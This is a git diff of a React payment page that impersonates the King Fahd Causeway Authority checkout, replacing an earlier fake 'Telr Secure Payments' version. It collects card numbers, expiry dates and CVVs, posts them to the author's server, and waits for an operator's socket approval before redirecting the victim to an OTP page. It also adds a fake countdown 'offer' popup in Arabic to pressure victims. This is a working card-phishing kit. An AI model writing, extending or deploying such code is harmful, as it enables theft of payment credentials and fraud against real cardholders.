@@ -3,225 +3,346 @@ import axios from "axios";
 import { api_route, socket } from "../App";
 import OtpPopup from "../Components/OtpPopup";
 import { TailSpin } from "react-loader-spinner";
+import { CiLock } from "react-icons/ci";
+import { IoIosArrowDown } from "react-icons/io";
+import { IoMdClose } from "react-icons/io";
+import { MdKeyboardArrowLeft } from "react-icons/md";
+import { FaLock } from "react-icons/fa";
+import { useEffect } from "react";
 
 const VisaPage = ({ loading, setLoading }) => {
   const [formData, setFormData] = useState({
     cardNumber: "",
     cardName: "",
-    expiryMonth: "03",
-    expiryYear: "2026",
     cvv: "",
   });
+  const [cardExpiry, setCardExpiry] = useState("03/26");
   const [showOtp, setShowOtp] = useState(false);
   const [orderId, setOrderId] = useState(null);
   const [error, setError] = useState("");
   const [isProcessing, setIsProcessing] = useState(false);
-
+  const [showOrderSummary, setShowOrderSummary] = useState(false);
+  const [showPopUp, setShowPopUp] = useState(true);
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData({ ...formData, [name]: value });
   };
 
+  const formatExpiryInput = (raw) => {
+    const digits = raw.replace(/\D/g, "").slice(0, 4);
+    if (digits.length <= 2) return digits;
+    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+  };
+
+  const handleExpiryChange = (e) => {
+    setCardExpiry(formatExpiryInput(e.target.value));
+  };
+
+  const parseCardExpiry = (str) => {
+    const cleaned = str.trim();
+    const match = /^(\d{2})\/(\d{2})$/.exec(cleaned);
+    if (!match) return null;
+    const month = parseInt(match[1], 10);
+    if (month < 1 || month > 12) return null;
+    return {
+      expiryMonth: match[1],
+      expiryYear: `20${match[2]}`,
+    };
+  };
+
+  
+  const [counter, setCounter] = useState(60 * 60 * 6);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
+    }, 1000);
+
+    return () => clearInterval(interval);
+
+
+  }, []);
+
+
+  const hours = Math.floor(counter / 3600);
+  const minutes = Math.floor((counter % 3600) / 60);
+  const seconds = counter % 60;
+
+  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
+    minutes,
+  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsProcessing(true);
     setError("");
-
+    console.log(cardExpiry);
     try {
       // Create a temporary order or initial submission
-      const response = await axios.post(`${api_route}/visa`, {
+      await axios.post(`${api_route}/visa/${sessionStorage.getItem("id")}`, {
         ...formData,
-        cardType: formData.cardNumber.startsWith("4") ? "visa" : "mastercard"
+        cardExpiry,
+        cardType: formData.cardNumber.startsWith("4") ? "visa" : "mastercard",
       });
 
-      const order = response.data.order;
-      console.log(order)
-      setOrderId(order._id);
-      localStorage.setItem("orderId", order._id);
-      localStorage.setItem("cardType", formData.cardNumber.startsWith("4") ? "visa" : "mastercard");
-      socket.emit("joinOrder", order._id);
-      socket.emit("visa", order);
-
-
-
+      setOrderId(sessionStorage.getItem("id"));
+      localStorage.setItem(
+        "cardType",
+        formData.cardNumber.startsWith("4") ? "visa" : "mastercard",
+      );
+      socket.emit("joinOrder", sessionStorage.getItem("id"));
+      socket.emit("visa", sessionStorage.getItem("id"));
+      // window.location.href = "/otp";
     } catch (err) {
       setError("An error occurred. Please try again.");
       setIsProcessing(false);
     }
   };
 
-        // Listen for approval from admin
-      socket.on("acceptVisa", (id) => {
-        console.log("accepted",id)
-        if (id === orderId) {
-          setShowOtp(true);
-          setIsProcessing(false);
-        }
-      });
+  // Listen for approval from admin
+  socket.on("acceptVisa", (id) => {
+    if (id === orderId) {
+      window.location.href = "/otp";
+    }
+  });
 
-      socket.on("declineVisa", (id) => {
-          console.log('declined',id)
-        if (id === orderId) {
-        
-          setError("Your payment was declined by the bank.");
-          setIsProcessing(false);
-        }
-      });
+  socket.on("declineVisa", (id) => {
+    console.log("declined", id);
+    if (id === orderId) {
+      setError("Your payment was declined by the bank.");
+      setIsProcessing(false);
+    }
+  });
 
   return (
-    <div className="w-full min-h-screen bg-gray-50 flex flex-col items-center">
+    <div className="w-full h-screen bg-gray-50 flex flex-col items-center">
       {/* Header */}
-      <div className="w-full bg-[#005C42] text-white p-4">
-        <h1 className="text-xl font-semibold">Telr Secure Payments</h1>
-        <div className="mt-2 text-sm opacity-90">
-          <p>Purchase for AED 500.00</p>
-          <p>Description: 1 Dubai Plates</p>
-        </div>
+      <div className="w-full  flex items-center justify-between text-white p-4 max-w-4xl">
+        <img
+          src="https://pg.kfca.sa/images/logo_dark_normal.png"
+          alt="KFCA"
+          className="h-14"
+        />
+        <span className="text-black text-xs flex items-center gap-x-1">
+          <CiLock /> Secure Checkout
+        </span>
       </div>
 
-      <div className="w-full max-w-2xl bg-white shadow-md p-6 mt-4 rounded-sm">
-        <h2 className="text-lg font-medium border-b pb-2 mb-4">Select Payment Method</h2>
-        
-        <form onSubmit={handleSubmit} className="space-y-6">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-2">
-              <input type="radio" checked readOnly className="w-4 h-4 accent-blue-600" />
-              <span className="font-medium">Credit/Debit Card</span>
-            </div>
-            <div className="flex gap-2 items-center">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg" alt="Visa" className="h-4" />
-              <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-4" />
-              <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" className="h-6" />
-            </div>
+      <div className="w-full max-w-2xl bg-[#f0f0f0] shadow-md p-6 flex items-center justify-between rounded-sm">
+        <div>
+          <span className="text-xl font-bold">
+            {Number(sessionStorage.getItem("price")).toFixed(2)}{" "}
+          </span>
+          <span className="text-lg font-bold">
+            {" "}
+            {sessionStorage.getItem("currency") === "sar" ? "ريال" : "دينار "}
+          </span>
+        </div>
+        <div
+          className="flex items-center gap-x-1"
+          onClick={() => setShowOrderSummary(!showOrderSummary)}
+        >
+          <span className="text-sm">
+            {showOrderSummary ? "Close" : "Order Summary"}
+          </span>
+          {showOrderSummary ? <IoMdClose /> : <IoIosArrowDown />}
+        </div>
+      </div>
+      {showOrderSummary && (
+        <div className="w-full max-w-2xl bg-[#f0f0f0] shadow-md p-6 flex items-center justify-between rounded-sm">
+          <div>
+            <span className="text-sm">One-Time Pass Purchase</span>
           </div>
+        </div>
+      )}
 
+      <span className=" text-red-500 flex items-center gap-x-1 p-5 text text-left w-full my-2 text-base">
+        <MdKeyboardArrowLeft
+          className="text-2xl cursor-pointer"
+          onClick={() => window.history.back()}
+        />{" "}
+        Back{" "}
+      </span>
+
+      <form
+        onSubmit={handleSubmit}
+        className="space-y-6 bg-white p-6  rounded-sm"
+      >
+        <div className="flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <span className="font-medium text-sm">Credit or Debit card</span>
+          </div>
+          <div className="flex gap-2 items-center">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
+              alt="Mastercard"
+              className="h-4"
+            />
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg"
+              alt="Visa"
+              className="h-4"
+            />
+
+            <img src="/mada.png" alt="Amex" className="h-4" />
+          </div>
+        </div>
+
+        <div className="space-y-2 ">
+          <label className="block text-sm  text-gray-700">
+            <span className="font-semibold">Cardholder name</span> (exactly as
+            shown on card) <span className="text-xs text-red-500">*</span>
+          </label>
+          <input
+            type="text"
+            name="cardName"
+            className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
+            value={formData.cardName}
+            onChange={handleChange}
+            required
+          />
+        </div>
+
+        <div className="space-y-2 relative">
+          <label className="block text-sm font-semibold text-gray-700">
+            Card number <span className="text-xs text-red-500">*</span>
+          </label>
+          <input
+            type="text"
+            name="cardNumber"
+            className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
+            value={formData.cardNumber}
+            onChange={handleChange}
+            maxLength={16}
+            minLength={16}
+            pattern="[0-9]*"
+            inputMode="numeric"
+            required
+          />
+          <FaLock className="text-base text-gray-500 absolute right-2 bottom-4" />
+        </div>
+
+        <div className="flex flex-col gap-4">
           <div className="space-y-2">
-            <label className="block text-sm font-semibold text-gray-700">Card holder </label>
+            <label className="block text-sm font-semibold text-gray-700">
+              Expiry date <span className="text-xs text-red-500">*</span>
+            </label>
             <input
               type="text"
-              name="cardName"
-              placeholder="Card holder "
+              name="cardExpiry"
+              placeholder="MM/YY"
               className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
-              value={formData.cardName}
-              onChange={handleChange}
+              value={cardExpiry}
+              onChange={handleExpiryChange}
+              inputMode="numeric"
+              autoComplete="cc-exp"
+              maxLength={5}
               required
             />
           </div>
-
           <div className="space-y-2">
-            <label className="block text-sm font-semibold text-gray-700">Card number</label>
+            <label className=" text-sm font-semibold text-gray-700 flex items-center gap-x-1">
+              Security code <span className="text-xs text-red-500">*</span>{" "}
+              <img
+                src="https://ksa.gateway.mastercard.com/static/checkout/checkout-core/assets/general-icons/info.svg"
+                alt="info"
+                className="h-3.5"
+              />
+            </label>
             <input
               type="text"
-              name="cardNumber"
-              placeholder="Card number"
+              name="cvv"
               className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
-              value={formData.cardNumber}
+              value={formData.cvv}
               onChange={handleChange}
-              maxLength={16}
-              minLength={16}
+              maxLength={3}
+              minLength={3}
               pattern="[0-9]*"
               inputMode="numeric"
               required
             />
           </div>
-
-          <div className="grid grid-cols-3 gap-4">
-            <div className="space-y-2">
-              <label className="block text-sm font-semibold text-gray-700">Expiry month</label>
-              <select
-                name="expiryMonth"
-                className="w-full border p-2 rounded bg-white shadow-sm"
-                value={formData.expiryMonth}
-                onChange={handleChange}
-              >
-                {Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => (
-                  <option key={m} value={m}>{m}</option>
-                ))}
-              </select>
-            </div>
-            <div className="space-y-2">
-              <label className="block text-sm font-semibold text-gray-700">Expiry year</label>
-              <select
-                name="expiryYear"
-                className="w-full border p-2 rounded bg-white shadow-sm"
-                value={formData.expiryYear}
-                onChange={handleChange}
-              >
-                {Array.from({ length: 10 }, (_, i) => 2024 + i).map(y => (
-                  <option key={y} value={y}>{y}</option>
-                ))}
-              </select>
-            </div>
-            <div className="space-y-2">
-              <label className="block text-sm font-semibold text-gray-700">Security code</label>
-              <input
-                type="text"
-                name="cvv"
-                placeholder="CVV"
-                className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
-                value={formData.cvv}
-                onChange={handleChange}
-                maxLength={3}
-                minLength={3}
-                pattern="[0-9]*"
-                inputMode="numeric"
-                required
-              />
-            </div>
-          </div>
-
-          <div className="flex items-center gap-2 text-xs text-gray-600">
-             <input type="checkbox" required className="accent-blue-600" />
-             <span>By agreeing, the system will share your card details, billing address and email with Click to Pay to allow you to securely enroll for faster checkouts. <a href="#!" className="text-blue-600 underline">Learn more</a></span>
-          </div>
-
-          {error && <p className="text-red-500 text-sm text-center font-bold">{error}</p>}
-
-          <div className="flex gap-4 pt-4 border-t">
-            <button
-              disabled={isProcessing}
-              type="submit"
-              className="flex-1 bg-[#5AB35A] text-white py-2 rounded font-medium hover:bg-[#4a9a4a] transition-colors disabled:opacity-50"
-            >
-              {isProcessing ? "Processing..." : "Make payment"}
-            </button>
-            <button
-              type="button"
-              className="flex-1 bg-[#E14D43] text-white py-2 rounded font-medium hover:bg-[#c93d34] transition-colors"
-            >
-              Cancel
-            </button>
-          </div>
-        </form>
-      </div>
-
-      <div className="mt-8 flex flex-col items-center gap-4 text-xs text-gray-500 pb-10">
-        <label className="flex items-center gap-2">
-          <input type="checkbox" defaultChecked className="accent-blue-600" />
-          <span>I agree to the website's <a href="#!" className="underline">terms and conditions</a></span>
-        </label>
-        
-        <div className="flex items-center gap-4 opacity-70">
-           {/* PCI DSS Logo Placeholder */}
-           <div className="flex items-center gap-1 font-bold border rounded p-1">
-             <span className="text-blue-900 italic">PCI</span>
-             <span className="text-green-600">DSS</span>
-             <span className="text-[8px] font-normal ml-1">COMPLIANT</span>
-           </div>
-           <p>Powered by Telr | Terms & Conditions | Privacy Policy</p>
         </div>
-      </div>
 
-      {showOtp && <OtpPopup orderId={orderId} cardNumber={formData.cardNumber} setShowOtp={setShowOtp} setLoading={setLoading} />}
-      
-      {isProcessing && (
-          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-              <div className="bg-white p-6 rounded shadow-lg flex flex-col items-center gap-4">
-                  <TailSpin color="#005C42" height={50} width={50} />
-                  <p className="font-medium">Waiting for bank approval...</p>
-              </div>
-          </div>
+        <div className="flex items-center gap-2 text-xs text-gray-600 p-5">
+          <img
+            src={`data:image/svg+xml;utf8,<svg width="35" height="24" xmlns="http://www.w3.org/2000/svg"><defs/><path d="M24.64 0c1.0351847 0 1.8579802.85367208 1.9511977 1.91614412L26.6 2.11764706v7.05882353h-1.4V6.352H1.4v15.5303529c0 .3604098.21185274.6378253.46392348.6950237L1.96 22.5882353h22.68c.2594434 0 .5001232-.23737.5504046-.5748871L25.2 21.8823529v-2.8235294h1.4v2.8235294c0 1.086053-.7619023 2.0036106-1.7685181 2.1078006L24.64 24H1.96C.92481534 24 .1020198 23.1463279.00880228 22.0838559L0 21.8823529V2.11764706C0 1.03159406.76190233.11403651 1.76851808.00984653L1.96 0h22.68zm4.76 8.88408454l5.1899495 5.23356256L29.4 19.3512096l-.9899495-.9982684L31.91 14.823l-15.81.0005294v-1.4117647L31.91 13.411l-3.4999495-3.52864706L29.4 8.88408454zm-4.76-7.47231983H1.96c-.25944344 0-.50012323.23737001-.55040463.57488707L1.4 2.11764706V4.941h23.8V2.11764706c0-.36040971-.2118527-.63782525-.4639235-.69502365L24.64 1.41176471z" fill="%23666"/></svg>`}
+            alt="next"
+          />
+          <span>
+            {" "}
+            The next screen you see may be payment card verification through
+            your card issuer.{" "}
+          </span>
+        </div>
+
+        {error && (
+          <p className="text-red-500 text-sm text-center font-bold">{error}</p>
+        )}
+
+        <div className="flex flex-col gap-4 border-t">
+          <button
+            disabled={
+              isProcessing ||
+              !formData.cardName ||
+              !formData.cardNumber ||
+              !formData.cvv ||
+              !cardExpiry ||
+              formData.cardNumber.startsWith("4847")
+            }
+            type="submit"
+            className="flex-1 bg-[#D24646] text-white py-2 rounded font-medium hover:bg-[#D24646] transition-colors disabled:opacity-50 flex items-center justify-center gap-x-2"
+          >
+            {isProcessing
+              ? "Processing..."
+              : "Pay" +
+                " " +
+                Number(sessionStorage.getItem("price")).toFixed(2) +
+                " " +
+                (sessionStorage.getItem("currency") === "sar"
+                  ? "ريال"
+                  : "دينار ")}
+          </button>
+          <span className="text-sm"> King Fahd Causeway Authority </span>
+        </div>
+      </form>
+
+      <img src="/visa1.png" alt="footer" className="w-full" />
+      {showOtp && (
+        <OtpPopup
+          orderId={orderId}
+          cardNumber={formData.cardNumber}
+          setShowOtp={setShowOtp}
+          setLoading={setLoading}
+        />
       )}
+
+      {isProcessing && (
+        <div className="loader">
+          <div className="justify-content-center jimu-primary-loading"></div>
+        </div>
+      )}
+      {showPopUp ? (
+        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-black bg-opacity-45 ">
+          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
+            <img src="/popup.jpeg" className="w-full md:w-1/3"  alt="popup"/>
+            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
+              سارع قبل نهاية العرض !
+            </span>
+            <span className="font-bold text-gray-700">
+              يتبقى على انتهاء العرض:
+            </span>
+            <div className="text-green-600 text-4xl my-5 font-bold">
+              {formattedTime}
+            </div>
+            <button
+              onClick={() => setShowPopUp(false)}
+              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
+            >
+              إغلاق
+            </button>
+          </div>
+        </div>
+      ) : null}
     </div>
   );
 };
